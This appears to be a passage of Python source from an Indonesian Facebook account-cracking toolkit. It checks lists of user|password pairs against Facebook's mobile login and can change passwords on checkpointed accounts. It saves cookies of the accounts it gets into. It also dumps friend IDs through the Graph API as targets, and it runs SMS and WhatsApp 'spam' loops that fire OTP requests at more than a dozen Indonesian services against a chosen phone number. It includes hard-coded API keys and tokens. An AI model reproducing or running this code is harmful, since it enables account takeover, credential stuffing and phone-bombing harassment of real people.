		print ('%s[+]\033[0mfile tidak ada'%(M))
		exit()

def cekopsi():
	CP = ("CP/")
	romi = input("[+]%s \033[0mNama file %s> %s"%(O,M,K))
	if romi == "":
		print("[+]%s \033[0misi yang benar "%(M));jeda(2)
		cekopsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n[+]%s \033[0mnama file %s\033[0m tidak tersedia"%(M,romi))
	jalan("\033[0m[+]%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(O))
	pw=input("\n[+]%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("\033[0m[+]%s \033[0mmasukan sandi %s> %s"%(O,M,K))
		if len(pw2) <= 5:
			print("[+] %ssandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	prints(nel(f'{P2}Total akun : {H2}{str(len(file_cp))}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s.%s \033[0mlogin akun %s> %s%s"%(str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n[+]%s \033[0mSelesai mengecek akun"%(O));jeda(0.07)
	input('[+]%s [%s Enter%s ] '%(O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = random.choice(ugen7)
	#ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
	url = "https://mbasic.trunkstable.facebook.com"
	session.headers.update({"Host": "mbasic.trunkstable.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.trunkstable.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.trunkstable.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		prints(nel(f'{P2}Terdapat {H2}{str(len(cek))} {P2}opsi{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						tree = Tree(" ")
						tree.add(f"\r[green]{user}|{pwbaru[0]}[white] ").add(f"\r[green]{ua}[white] ")
						tree.add(f"\r[green]{coki}[white] ")
						Buat(tree)
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
        


###----------[ AUTHOR ]---------- ###

# --> Modules
import requests,bs4,sys,os,datetime,re
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 
# -->  Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

# --> Waktu
def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        prints(nel(f'{P2}Program Selesai Dalam Waktu %s Menit %s Detik{P2}'%(Menit,Detik),width=70,padding=(0,7),style=f"{color_panel}")) 
    except Exception as e:
    	prints(nel(f'{P2}Program Selesai Dalam Waktu 0 Detik{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 

# --> Main Program
class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input('[+] Url Anda : ')
        prints(nel(f'{P2}[{color_text}1{P2}]. Source Payload\n[{color_text}2{P2}]. Parsed Payload\n[{color_text}3{P2}]. Source Code Post Requests{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        self.tanya = input('[+] Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)

    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\nIsi  Yg Benar!')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        prints(nel(f'{P2}Souce Payload{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        prints(nel(f'{P2}Parsed Payload{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        prints(nel(f'{P2}Souce Code Post Request{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        # --> Tampil Get Requests
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print("cookie = requests.Session().cookies.get_dict()")
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#----------[BUAT DUMP ID SAMA]----------#
import os, re, requests, random, json, time, sys
from time import sleep

class Asepitgans_xXc:
	def __init__(self):
		self.id = []
		self.loop = 0
		try:
			self.cookie = open(".cok.txt","r").read()
			self.token = open(".token.txt","r").read()
			try:
				url = requests.get("https://graph.facebook.com/me?fields=id,name&access_token="+self.token,cookies={"cookie":self.cookie})
				nm_ = json.loads(url.text)["name"]
				id_ = json.loads(url.text)["id"]
				self.menu(id_,nm_,)
			except KeyError:
				Asepitgans_Xc()
			except requests.exceptions.ConnectionError:
				prints(nel(f'{P2}Koneksi jaringan tidak stabil{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		except FileNotFoundError:
			Asepitgans_Xc()
	def menu(self, idku, nmku):
		prints(nel(f'{P2} Hallo welcome {H2}{nmku}{P2} monyet{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		teks = f'''[•] Masukan id : '''
		user = input(teks)
		try:
			header = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"}
			req = requests.get("https://graph.facebook.com/v15.0/"+user+"?fields=friends.limit(5000){id,name}&access_token="+self.token,cookies={"cookie": self.cookie},headers=header).json()
			for res in req['friends']['data']:
				try:self.id.append(res['id'])
				except:continue
			self.tanya()
		except (KeyError,IOError):
			prints(nel(f'{P2}ID anda sepertinya tidak publik{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	def tanya(self):
		prints(nel(f'''{P2}[{color_text}1{P2}]. 10001      [{color_text}6{P2}]. 10006
[{color_text}2{P2}]. 10002      [{color_text}7{P2}]. 10007
[{color_text}3{P2}]. 10003      [{color_text}8{P2}]. 10008
[{color_text}4{P2}]. 10004      [{color_text}9{P2}]. 10009
[{color_text}5{P2}]. 10005      [{color_text}0{P2}]. 10000{P2}''',width=70,padding=(0,7),style=f"{color_panel}")) 
		pilih = input('[•] Pilih : ')
		if pilih =='1':self.dump_lagi('1')
		if pilih =='2':self.dump_lagi('2')
		if pilih =='3':self.dump_lagi('3')
		if pilih =='4':self.dump_lagi('4')
		if pilih =='5':self.dump_lagi('5')
		if pilih =='6':self.dump_lagi('6')
		if pilih =='7':self.dump_lagi('7')
		if pilih =='8':self.dump_lagi('8')
		if pilih =='9':self.dump_lagi('9')
		if pilih =='0':self.dump_lagi('0')
	def dump_lagi(self,target):
		prints(nel(f'{P2}Hasil dump tersimpan di: /sdcard/dump/1000{target}.txt\nKlik ctrl z untuk berhenti dump{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		for user in self.id:
			try:
				header = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"}
				req = requests.get("https://graph.facebook.com/v15.0/"+user+"?fields=friends.limit(5000){id,name}&access_token="+self.token,cookies={"cookie": self.cookie},headers=header).json()
				for res in req['friends']['data']:
					sys.stdout.write(f'\r[•] Mengumpulkan id: {self.loop}')
					try:
						inpo = res['id']
						if inpo[0:5] == f'1000{target}':
							open(f'/sdcard/dump/1000{target}.txt','a').write(res['id']+'|'+res['name']+'\n')
							self.loop+=1
						else:continue

					except:
						continue
			except (KeyError,IOError,AttributeError):continue
agent = []
#---------[USER AGENT MEMEK]----------#
agent = random.choice(
			[
				"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
				"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
				"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
		]
	)

#----------[BAUT SPAM SMS]----------#
def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	prints(nel(f'{P2}Contoh : {H2}+6281234567xxx{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	nomor = input(f"[+] input no hp :\033[32m +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}tunggu sedang spam sms...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "User-Agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "User-Agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "User-Agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "User-Agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"User-Agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"User-Agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		prints(nel(f'{P2}Sukses spam SMS ke no : {K2}+62{nomor}{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		
#-----------[BUAT SPAM WHATSAPP]---------#
def spam_wa():
	global nomor
	prints(nel(f'{P2}Contoh : {H2}+6281234567xxx{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	nomor = input(f"[+] input no hp :\033[32m +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}tunggu sedang kirim pesan ke WhatsApp...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
